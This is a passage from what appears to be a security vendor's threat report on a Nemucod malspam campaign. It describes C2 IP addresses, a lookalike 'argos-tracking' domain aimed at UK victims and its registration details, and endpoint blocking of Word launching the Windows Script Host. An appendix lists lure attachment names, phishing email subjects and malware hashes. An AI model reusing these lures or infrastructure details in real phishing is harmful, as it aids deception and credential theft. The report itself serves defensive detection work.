<p>Figure 30: Partial infrastructure</p>
<p>Following along that theme of the actors versions using different C2 communication hosts, the following figure shows yet more groups of versions using other IP addresses for their C2. The two IPs below once again share the same class C network range as each other with one IP (217.28.218[.]231) being used for only one version (arrow #1), which happens to be the first seen in AutoFocus on October 26<sup>th</sup> (the one with the Breaking Bad references) while the other IP (217.28.218[.]210) hosts twelve known versions C2 communications, three of which are PE executable credential stealers; the remainder are weaponized documents.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_28-1.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-29483" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_28-1.png" alt="nemucod_28" width="973" height="467" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_28-1.png 973w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_28-1-900x432.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_28-1-300x144.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_28-1-768x369.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_28-1-370x178.png 370w" sizes="(max-width: 973px) 100vw, 973px" /></a></p>
<p>Figure 31: Partial infrastructure, including first version from October 26<sup>th</sup>.</p>
<p>Two weaponized document versions, shown in Figure 32 below were seen on the 19<sup>th</sup> and 30<sup>th</sup> of December in AutoFocus. These versions were a little different from the majority that were emailed to their victims as these were downloaded over the web-browsing application (HTTP) from the website argos-tracking.co[.]uk. The victim organisations belonged to the Telecommunications and Healthcare sectors in the United Kingdom.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_29-1.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-29459" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_29-1.png" alt="nemucod_29" width="975" height="667" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_29-1.png 975w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_29-1-900x616.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_29-1-300x205.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_29-1-768x525.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_29-1-370x253.png 370w" sizes="(max-width: 975px) 100vw, 975px" /></a></p>
<p>Figure 32: Partial infrastructure showing argos-tracking domain name.</p>
<p>The .co.uk Second Level Domain (SLD) is intended for UK-based businesses and, when combined with the words argos and tracking, would resonate with many UK citizens as possibly being related to the UK-based retailer business Argos, which has an online retail presence including a parcel tracking service. Given this information, and the UK targets seen using AutoFocus, its clear the threat actors were trying to deceive and socially engineer UK victims.</p>
<p>According to the WHOIS records the argos-tracking.co[.]uk domain registrant, a Mr Milosh Zotich from Belgrade, Serbia registered this now-suspended domain on the 15<sup>th</sup> December 2016  just 4 days before AutoFocus saw use of the domain  and provided the domain names parking-1.domains4bitcoins[.]com and parking-2.domains4bitcoins[.]com as nameservers. Domains4bitcoins needs little introduction but just in case you werent aware, such services are used for domain registration and hosting services in an anonymous fashion through the use of a digital crypto currency. These nameservers were updated on December 20<sup>th</sup> to various nameservers at ClouDNS, a site offering free DNS hosting and domain names.</p>
<p>The most recent change to the argos-tracking.co[.]uk domain was on the 22<sup>nd</sup> February 2017 to suspend it. This example highlights the lengths the actors will go to in their reconnaissance of their victims in order to increase their changes of successful compromise.</p>
<p><strong><span lang="EN-GB">Conclusions</span></strong></p>
<p>Nemucod malware is mostly deployed using weaponized documents where the malicious VBA macro code is responsible for constructing and executing a malicious encoded JScript file that carries out further activities including registering victims with the actors before downloading payloads, which in this case included a credential stealing Trojan executable component.</p>
<p>Though the encoded JScript content was dropped by executable files attached to emails in malspam campaigns it was a much less common technique compared to weaponized documents dropping the content, most likely due to a reduced infection success rate because of the additional suspiciousness executable files on email pose.</p>
<p>This particular Nemucod campaign was seen by Unit 42 and AutoFocus running from late October through to late March 2017 impacting various countries, especially within Europe, and across various industries.</p>
<p>Given the details discussed in this blog, such as the argos-tracking.co[.]uk domain registration information; the location of the IP addresses and that many belong to a Russian-owned hosting service, King Servers; and the weaponized document code page and language settings its highly likely this malware, the attack campaigns and the threat actors originate from Eastern European countries.</p>
<p>Much like the evolutionary changes to the delivery documents, obfuscation techniques and social engineering methods used in this campaign, other malspam campaigns recently have highlighted the pace of development and changes within a single campaign to collect more victims or remain undetected for longer, as described <a href="http://researchcenter.paloaltonetworks.com/2017/04/unit42-mole-ransomware-one-malicious-spam-campaign-quickly-increased-complexity-changed-tactics/">in another Unit 42 blog</a>.</p>
<p>Palo Alto Networks customers are protected by these threats in the following ways:</p>
<ul>
<li>All samples discussed are classified as malicious by the WildFire sandbox platform.</li>
<li>All identified domains have been classified as malicious.</li>
<li>AutoFocus users can track the malware described in this report using the <a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.Nemucod">Nemucod</a> tags.</li>
<li>Customers running Traps are protected by preventing Nemucod from executing.</li>
</ul>
<p>When executing any of the weaponized documents on a Traps-protected end-point one of the default restrictions will be triggered protecting the system due to the suspicious execution of a child processes. In this case Winword.exe (Words process) tries to execute wscript.exe (Windows Scripting Hosts process). Given these weaponized documents often arrive through email a more real-world scenario would include a larger process tree of Outlook (or equivalent email application) executing Word in turn executing the Windows Scripting Host. Figure 33 below shows a typical Traps Prevention Alert for such activity.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_31-1.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-29435" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_31-1.png" alt="nemucod_31" width="871" height="481" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_31-1.png 871w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_31-1-300x166.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_31-1-768x424.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_31-1-370x204.png 370w" sizes="(max-width: 871px) 100vw, 871px" /></a></p>
<p>Figure 33: Traps Advanced End-point preventing the malware infection via child process restrictions.</p>
<p>Figure 34 below shows in more detail, through the Enterprise Service Manager (ESM) the host affected, the restriction that triggered (1), the host system and the processes involved (2) as well as their hashes, versions, digital signatures, if any, and any related files or URLs. In this case the JSE file that was attempting to run in the context of the Windows Scripting Host process is listed (3).</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_32.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-29315" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_32.png" alt="nemucod_32" width="975" height="420" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_32.png 975w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_32-900x388.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_32-300x129.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_32-768x331.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_32-370x159.png 370w" sizes="(max-width: 975px) 100vw, 975px" /></a></p>
<p>Figure 34: Traps Enterprise Service Manager (ESM) detailing the restriction and blocked malware.</p>
<h3><span lang="EN-GB">Appendix A: Indicators of Compromise</span></h3>
<p><strong>Email Attachment Names:</strong></p>
<p>Microsoft Office Word Document.doc</p>
<p>Details.doc</p>
<p>List.doc</p>
<p>Doc1.doc</p>
<p>Agr.doc</p>
<p>YoursDoc.doc</p>
<p>Docs.doc</p>
<p>YourGoods.doc</p>
<p>R.doc</p>
<p>r_vk.doc</p>
<p>Vertragskopie</p>
<p>goods.doc</p>
<p>Agreement_copies.doc</p>
<p>documents.doc</p>
<p>Vertrag.doc</p>
<p>file</p>
<p>Bishop-GmbH-Vertrag.doc</p>
<p>Rechn.doc</p>
<p>Rec.doc</p>
<p><strong>Email Subjects:</strong></p>
<p>Your Eguipment</p>
<p>AW:Your order was completed</p>
<p>AW:Delivery</p>
<p>Re:Delivery</p>
<p>Documents</p>
<p>AW:Goods</p>
<p>Delivery</p>
<p>Goods</p>
<p>Package</p>
<p>Re:Documents</p>
<p>AW:Package</p>
<p>Re:Order</p>
<p>Re:Waiting for payment</p>
<p>AW:Waiting for payment</p>
<p>Re:agreement</p>
<p>Re:Your order was completed</p>
<p>AW:Order</p>
<p>AW:Documents</p>
<p>Re:Package</p>
<p>Re:Goods</p>
<p>AW:agreement</p>
<p>Get Carried Away at The Peninsula</p>
<p>Discover The Revolutionary Trick To Restore Your Memory!</p>
<p>RE: Rechnung</p>
<p>AW:Rechnungen</p>
<p>RE:Rechnungen</p>
<p>AWd: Rechnung</p>
<p>RE: billing terms</p>
<p>RE: We are waiting for your payment.</p>
<p>RE: payment</p>
<p>AWd:Rechnungen</p>
<p>AW:Auftrag</p>
<p>AW:Dokumentation</p>
<p>AW:Technikdokumentation</p>
<p>RE:Begleichung</p>
<p>AW:Schlussbestimmungen</p>
<p>re:bishop-gmbh-vertrag</p>
<p>AW: Rechnung</p>
<p><strong>PE Dropper Hashes</strong></p>
<p>1b64d1c93e53fa74d89c3362c30899644e9fef7f11292f40740b216bcbe03285</p>
<p>1db89009b678ba4517fc7490b9a7f597b838939499365374eba32347393fdd4e</p>
<p>85d56628f7ec277a5f49a801ef4793072edd56d9c26b0bdb9b3dc348366c734a</p>
<p>b75b3ff65632b65d1d641075bd2f5ed0ede93da3a35d7f50068b9371ee5c4552</p>
<p>ffc5e46200f16549f17d2d6e4d6e5e61239b711cd07fbf7932c31e2ea18a7865</p>
<p><strong>Document Dropper Hashes</strong></p>
<p>0a59bc35fe7bd84c955402aba2ad3883a5cdb08deb353c8f6310a163109f0c60</p>
<p>fee6b19ff8a39e83756345af421d3d85d20e67df62ac58bc05f514c368efc329</p>
<p>8e9af7d90193bddc89d1c3782477bde76f90707eb1900537c020fc02970bbd74</p>
<p>c173085b954ff1055fb859e6584a9e0bb3919740752351ad50706c0b7be37b51</p>
<p>1faa27f82bcbad0acc444727e7be35147e5a2ee92757781e5f26db614d3cee7f</p>
<p>6ebd2955fb137b5c983bbfb7601ea49ceb1f66119d13ce850c12d89e8c6a3742</p>
<p>777560483cb903ba803bfdbbd1f37353706da3a265e32da44fffb3ec7fcf07a2</p>
<p>7df6bd0af983f87dc34a71d009a3bd3bd272e094c6c55bf765148d836129e10c</p>
<p>d58cfd2d851b9c98f9de79d38944d72eddec1e2243f1065de7d8b1ed1bf1cddd</p>
<p>4916bc8dc91941a444d3aa41616eaebe8c3d4b095a0c566945b85c143ae532c1</p>
<p>de5ac4aedaca5649758bf34c87fd59967c2adeaaa0be65a58b9c8e9f6a8660f1</p>
<p>368304125ffd86a234aeb8c05a90b7ee40b37dae1dea7178deeda522eac9dcbc</p>
<p>1384934c09f6551d19150bfcf8ae954f4969d0b9ff841c93f81ebb57eecc9a71</p>
<p>f89edff923d1d2daf6b2ab36595e873ed7d1cd52c2f6b66b590fa636c17dced2</p>
<p>b1d5bfb124a15ab9068cf413de430a1c2cbd7b2bf67a766cf971269c67c3eace</p>
<p>256078f83cf9535c72debffa3d34818789849131e9138589728b4085e2ae2169</p>
<p>d3683a4fe910d5815541beb2c42b98827a1f6362073b9901a74c36e15072c1a2</p>
<p>cfe56d178ff873a5d984220c96570144a6674ce1b675036566a93ff6d680a981</p>
<p>069a4abb186efb6c3b6733cb2f35151d03eefe40cfb626d3c42aaa5f7ef342c6</p>
<p>97ea044a5820f9271c21bd8f1bb381099fb188a7d9f54ac72a88bf41411cf1b3</p>
<p>5b331693bc7ad009db3905fd37edfa94c528b6c4eee024f7a35dcc9b6b8a9c26</p>
<p>7e62823f8a775674b6333ff535e93a9fc0bdcfd943c903fe85e614b34d692549</p>
<p>a85b040e923e45a3e139576c2086a8f1671b1c60053274d850218ffa422f80e6</p>
<p>1c95a2a32b639008245a205f51aa7fbafc0b61ecc6879f9978be174feee516f4</p>
<p>9e9e7ade1def82a56898415c079bd3f861c143f9db6770a28592bbbe04d5f234</p>
<p>40fd876c5d7f859484a8d3a021ce3c5eeba23deb8574f4b598aeaa6a0ded7815</p>
<p>92c82d7ea7b89f02c5b8e7d93d2a4ad17fbc0688ff9ad881cc185c18ea466232</p>
<p>ae3bb85b87d40a12e82b2545fd4c9087b3e847a744a27c1ac215dd38821ced87</p>
<p>c600c7638474fb31664ab32fb9aad5c216096b2c68d93c9eb37cf0476868cf05</p>
<p>8451cf3f5e5e2576f2ad36a4f19998e5824c2ab185f40ddec460a81ab1a8525a</p>
<p>34e5104bea2728cf9107b4ede124daee8ac68ad0979c66c356ddf3a0e6d0f4c6</p>
<p>7b48b21b10990cd53bb8969930b9f0b39cc495e95a33c38f80024a21a72b0176</p>
<p>dcf3c00a20af527869771a7834565fb938739e3abf84038e2376b23a14926a38</p>
<p>d8e62ce3039921c11872319a09acc61038f2452a6a2fdb8c0d3a0848b56b26ff</p>
<p>50ab7834e98c2f40d7441006a0221c07bff5f9f694999b595daa29b37c9a5e12</p>
<p>b4d3c369449ead7ced48f84b9ea29cb4dbc6f485958e813b102c1d32ce62d3e8</p>
<p>a02ed37812ac37d44979d5131aa10927fb9b9bd09aae2b470e65532bc694b27c</p>
<p>61bcd9b0c11989d6049fd181786f1748116c128bd4768d1b6849805186190320</p>
<p>6edbbc7f02179211c5b8da74a770492e25b31be683468629a073f313f25ec8b6</p>
<p>985d44dfeaf83c2c39c331e4b07b19e8726fb0ec168223455476132fe8c32fc8</p>
<p>1a60afa5c3dcff0fc41179e6a3b71ea0a92e4b50192eaa4c8e2b16ea0c50a229</p>
<p>76edebe74e015e709abb662c4fa8a2db2f24c12d5b6c51822eef403bf3c3a304</p>
<p>3fdcaf24d5c45d7a8dcf1b2932c026915a982de19b52a8f346ca312c58d36f05</p>
<p>561343438f0c26fa7628a91584628a5bd62c3abe1c0cf890b9fdb0528adbde62</p>
<p>7f53abc951258d5663119f3ac383b8f84da5acbf0bb9063e5e113ca87b1843ae</p>
<p>7c552166089ebf45081a5d14bef331e3153a5de50c53b66211b044a08f46153c</p>
<p>432a220ca1e6c64546f21807e17521c243cce2a63d956d0c0cf21a1101835829</p>
<p>297665276699830549c83ae79cd2c48e23733e9569be8040ee38d08a4d99192e</p>
<p>5e54c865afbd42f5a7b4007840e3099d8e1882c58542d08263ffc23fe994ef9b</p>
<p>8aa5a12bb237f93fc0c3f150a41fcc60e86007b1000c2b133457b2be27dfad4e</p>
<p>8e7f77a61a1e710e368257a37fe6785f9b608bb068e5c40824623d299997dbf0</p>
<p>379615acf199bb0beaee736824067b83dcbb2ae60eb648576c81d4971330dd16</p>
<p>ad94f396f739d4df07f188b9babee829d07da01c986f4795a098d66137c7149c</p>
<p>ff7fa949a99d745143d41eeb6b450dca3d95a38031e304b1e829c5bda2ce5213</p>
<p>034421d601d43883528d68741c87e765d76ff4123161d364f6eddfae1f3c7493</p>
<p>e86c5f4fbcd626e1ec4c211ae1ed0d541fc453e6753e84a724f534c0b9700029</p>
<p>8b96d5316accd7d2ee0af01a4ae2766b7173d7705b3eef14d9dcb10cd34238ed</p>
<p><strong>PE Password Stealer Hashes</strong></p>
<p>53edea186162d84803f8ff72fb83c85f427b3813c32bd9d9d899e74ae283368e</p>
<p>76b703c9430abf4e0ba09e6d4e4d6cf94a251bb0e7f3fadbd169fcef954a8b39</p>
<p>99c50b658c632214f0b133f8742a5e6d2d34e47497d7a08ed2d80e4299be3502</p>
<p>&nbsp;</p>
<hr />
<div class="quizz-container" data-width="100%" data-iframe-title="QUIZ: What Kind of Ignite Guardian Are You?" data-height="auto" data-quiz="385597"></div>
<p><script src="//dcc4iyjchzom0.cloudfront.net/widget/loader.js" async></script></p>
<p class="p2"><span class="s2"><a href="http://go.paloaltonetworks.com/ignite2017"><b>Register for Ignite 17 Security Conference </b></a><br />
<i>Vancouver, BC June 1215, 2017</i></span></p>
<p class="p2"><span class="s2">Ignite 17 Security Conference is a live, four-day conference designed for todays security professionals. Hear from innovators and experts, gain real-world skills through hands-on sessions and interactive workshops, and find out how breach prevention is changing the security industry. Visit the <a href="http://www.paloaltonetworksignite.com/"><span class="s3">Ignite website</span></a> for more information on tracks, workshops and marquee sessions.</span></p>
          <div class="article__subscribe mb-40 text-gray-400 bg-gray-200 rounded-lg">
  <h4 class="h3 mb-10 text-black">Get updates from <br class="d-sm-none"> Palo Alto<br class="d-sm-none"> Networks!</h4>
  <p>Sign up to receive the latest news, cyber threat intelligence and research from us</p>
  <!-- <form action="https://app-guse4001.marketo.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe"> -->
  <form action="https://start.paloaltonetworks.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe">
    <input type="hidden" value="1086" name="formid">
    <!-- <input type="hidden" value="818-CZC-273" name="munchkinId"> -->
    <input type="hidden" value="531-OCS-018" name="munchkinId">
    <input type="hidden" value="2141" name="lpId">
    <input type="hidden" value="1086" name="formVid">
    <input type="hidden" name="mkto_optinunit42" value="true">
    <input type="hidden" name="mkto_opt-in" value="true">
    <div class="row">
      <div class="col-sm col-12 mb-sm-0 mb-15">
        <input type="email" name="Email" placeholder="Email address" class="subscribe-field d-block w-100 px-sm-25 px-15 bg-white">
        <p class="error-mail d-none mt-15 text-danger" style="color: #dc3545">Please enter your email address!</p>
      </div>
      <div class="col-sm-auto col-12">
          <input type="submit" value="Subscribe" class="btn btn--black btn--sm w-100" disabled="disabled">
      </div>
    </div>

    <div class="google-recapth mt-15">
      <div class="g-recaptcha" data-expired-callback="captchaExpires" data-callback="captchaComplete" data-sitekey="6LfKOrwUAAAAAOwgjxrEcx-pcfwe8OquUw6ommTK"></div>
      <p class="error-recaptcha d-none mt-15 text-danger" style="color: #dc3545">Please mark, I'm not a robot!</p>
    </div>
  </form>

  <div class="font-size-ex-sm col-sm-7 p-0">
    <p>By submitting this form, you agree to our <a href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a> and acknowledge our <a href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy Statement</a>.</p>
  </div>
</div>

<script type="text/javascript" src="https://researchcenter.paloaltonetworks.com/wp-content/plugins/google-analyticator/external-tracking.min.js?ver=6.4.9"></script>
        </div>
      </div>
    </div>
  </article>
<footer class="site-footer px-sm-0 px-15">
  <div class="pt-40">
    <div class="container pt-sm-30">
      <div class="row justify-content-lg-center">
        <div class="col-lg-11 col-12">
          <div class="row">
            <div class="col-lg-4 col-sm-3 col-12 order-sm-2">
              <nav class="footer-socials mb-sm-0 mb-25 text-white text-sm-right">
                                                <a href="https://twitter.com/Unit42_Intel" target="_blank"><span class="ui ui-4"></span></a>
                <a href="https://github.com/pan-unit42" target="_blank"><span class="ui ui-5"></span></a>
              </nav>
            </div>

            <div class="col-lg-8 col-sm-9 col-12 order-sm-1">
              <div class="row">
                <div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Popular Resources</h4><div class="menu-footer-company-phase-container"><ul id="menu-footer-company-phase" class="menu"><li id="menu-item-97096" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97096"><a target="_blank" href="https://www.paloaltonetworks.com/resources">Resource Center</a></li>
<li id="menu-item-97097" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97097"><a target="_blank" href="https://researchcenter.paloaltonetworks.com/">Blog</a></li>
<li id="menu-item-97098" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97098"><a target="_blank" href="https://www.paloaltonetworks.com/communities">Communities</a></li>
<li id="menu-item-97099" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97099"><a target="_blank" href="https://docs.paloaltonetworks.com/">Tech Docs</a></li>
<li id="menu-item-97100" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-97100"><a href="https://unit42.paloaltonetworks.com/">Unit 42</a></li>
<li id="menu-item-97101" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97101"><a target="_blank" href="https://www.paloaltonetworks.com/sitemap">Sitemap</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Legal Notices</h4><div class="menu-footer-legal-notices-phase-container"><ul id="menu-footer-legal-notices-phase" class="menu"><li id="menu-item-97093" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97093"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy</a></li>
<li id="menu-item-97094" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97094"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a></li>
<li id="menu-item-97095" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97095"><a target="_blank" href="https://www.paloaltonetworks.com/legal">Documents</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Account</h4><div class="menu-footer-trending-topics-phase-container"><ul id="menu-footer-trending-topics-phase" class="menu"><li id="menu-item-97102" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97102"><a href="https://start.paloaltonetworks.com/preference-center">Manage Subscriptions</a></li>
<li id="menu-item-97103" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97103"><a href="#">&nbsp;</a></li>
<li id="menu-item-97104" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97104"><a href="https://www.paloaltonetworks.com/security-disclosure">Report a Vulnerability</a></li>
</ul></div></div>              </div>
            </div>
          </div>

          
            <div class="copyrights py-25 mt-40">
               <p> 2020 Palo Alto Networks, Inc. All rights reserved.</p>
            </div>
          
        </div>
      </div>
    </div>
  </div>
</footer>
    <script type="text/javascript">
	var isProcessing = false; 
    function alter_ul_post_values(obj,post_id,ul_type){
	
		if (isProcessing)    
		return;  
		isProcessing = true;   
		
		jQuery(obj).find("span").html("..");
                jQuery.ajax({
                    type: "POST",
                    url: "https://unit42.paloaltonetworks.com/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php",
                    data: "post_id="+post_id+"&up_type="+ul_type,
                    success: function(msg){
                            jQuery(obj).find("span").html(msg);
                            isProcessing = false; 
                            jQuery(obj).find('svg').children('path').attr('stroke','#0050FF');
                            jQuery(obj).removeClass('idc_ul_cont_not_liked idc_ul_cont_not_liked_inner');
                    }
 		});
	}
	</script>
            <script type="text/javascript">
            (function(){
                document.addEventListener('DOMContentLoaded', function(){
                    let wpp_widgets = document.querySelectorAll('.popular-posts-sr');

                    if ( wpp_widgets ) {
                        for (let i = 0; i < wpp_widgets.length; i++) {
                            let wpp_widget = wpp_widgets[i];
                            WordPressPopularPosts.theme(wpp_widget);
                        }
                    }
                });
            })();
        </script>
                <script>
            var WPPImageObserver = null;

            function wpp_load_img(img) {
                if ( ! 'imgSrc' in img.dataset || ! img.dataset.imgSrc )
                    return;

                img.src = img.dataset.imgSrc;

                if ( 'imgSrcset' in img.dataset ) {
                    img.srcset = img.dataset.imgSrcset;
                    img.removeAttribute('data-img-srcset');
                }

                img.classList.remove('wpp-lazyload');
                img.removeAttribute('data-img-src');
                img.classList.add('wpp-lazyloaded');
            }

            function wpp_observe_imgs(){
                let wpp_images = document.querySelectorAll('img.wpp-lazyload'),
                    wpp_widgets = document.querySelectorAll('.popular-posts-sr');

                if ( wpp_images.length || wpp_widgets.length ) {
                    if ( 'IntersectionObserver' in window ) {
                        WPPImageObserver = new IntersectionObserver(function(entries, observer) {
                            entries.forEach(function(entry) {
                                if (entry.isIntersecting) {
                                    let img = entry.target;
                                    wpp_load_img(img);
                                    WPPImageObserver.unobserve(img);
                                }
                            });
                        });

                        if ( wpp_images.length ) {
                            wpp_images.forEach(function(image) {
                                WPPImageObserver.observe(image);
                            });
                        }

                        if ( wpp_widgets.length ) {
                            for (var i = 0; i < wpp_widgets.length; i++) {
                                let wpp_widget_images = wpp_widgets[i].querySelectorAll('img.wpp-lazyload');

                                if ( ! wpp_widget_images.length && wpp_widgets[i].shadowRoot ) {
                                    wpp_widget_images = wpp_widgets[i].shadowRoot.querySelectorAll('img.wpp-lazyload');
                                }

                                if ( wpp_widget_images.length ) {
                                    wpp_widget_images.forEach(function(image) {
                                        WPPImageObserver.observe(image);
                                    });
                                }
                            }
                        }
                    } /** Fallback for older browsers */
                    else {
                        if ( wpp_images.length ) {
                            for (var i = 0; i < wpp_images.length; i++) {
                                wpp_load_img(wpp_images[i]);
                                wpp_images[i].classList.remove('wpp-lazyloaded');
                            }
                        }

                        if ( wpp_widgets.length ) {
                            for (var j = 0; j < wpp_widgets.length; j++) {
                                let wpp_widget = wpp_widgets[j],
                                    wpp_widget_images = wpp_widget.querySelectorAll('img.wpp-lazyload');

                                if ( ! wpp_widget_images.length && wpp_widget.shadowRoot ) {
                                    wpp_widget_images = wpp_widget.shadowRoot.querySelectorAll('img.wpp-lazyload');
                                }

                                if ( wpp_widget_images.length ) {
                                    for (var k = 0; k < wpp_widget_images.length; k++) {
                                        wpp_load_img(wpp_widget_images[k]);
                                        wpp_widget_images[k].classList.remove('wpp-lazyloaded');
                                    }
                                }
                            }
                        }
                    }
                }
            }

            document.addEventListener('DOMContentLoaded', function() {
                wpp_observe_imgs();

                // When an ajaxified WPP widget loads,
                // Lazy load its images
                document.addEventListener('wpp-onload', function(){
                    wpp_observe_imgs();
                });
            });
        </script>
        <link rel='stylesheet' id='wpdevart_lightbox_front_end_css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/wpdevart_lightbox_front.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpdevart_lightbox_effects-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/effects_lightbox.css?ver=5.4.1' type='text/css' media='all' />
<script type='text/javascript' src='https://www.google.com/recaptcha/api.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/scripts/main.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/wp-embed.min.js?ver=5.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpdevart_lb_variables = {"eneble_lightbox_content":"enable","overlay_transparency_prancent":"80","popup_background_color":"#000000","popup_loading_image":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/popup_loading.png","popup_initial_width":"350","popup_initial_height":"300","popup_youtube_width":"640","popup_youtube_height":"410","popup_vimeo_width":"500","popup_vimeo_height":"410","popup_max_width":"5000","popup_max_height":"5000","popup_position":"5","popup_fixed_position":"true","popup_outside_margin":"0","popup_border_width":"2","popup_border_color":"#000000","popup_border_radius":"10","control_buttons_show":"true","control_buttons_show_in_content":"false","control_buttons_height":"30","control_buttons_line_bg_color":"#000000","control_button_prev_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev.png","control_button_prev_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev_hover.png","control_button_next_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next.png","control_button_next_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next_hover.png","control_button_download_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download.png","control_button_download_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download_hover.png","control_button_innewwindow_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow.png","control_button_innewwindow_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow_hover.png","control_button_fullwidth_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth.png","control_button_fullwidht_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth_hover.png","control_button_fullwidthrest_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset.png","control_button_fullwidhtrest_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset_hover.png","control_button_close_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close.png","control_button_close_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close_hover.png","information_panel_show":"false","information_panel_show_in_content":"false","information_panel_bg_color":"#000000","information_panel_default_transparency":"100","information_panel_hover_trancparency":"100","information_panel_count_image_after_text":"Image","information_panel_count_image_middle_text":"of","information_panel_count_padding_left":"15","information_panel_count_padding_right":"4","information_panel_count_font_size":"20","information_panel_desc_padding_left":"15","information_panel_desc_padding_right":"4","information_panel_desc_font_size":"20","information_panel_desc_show_if_not":"true","information_panel_text_for_no_caption":"No 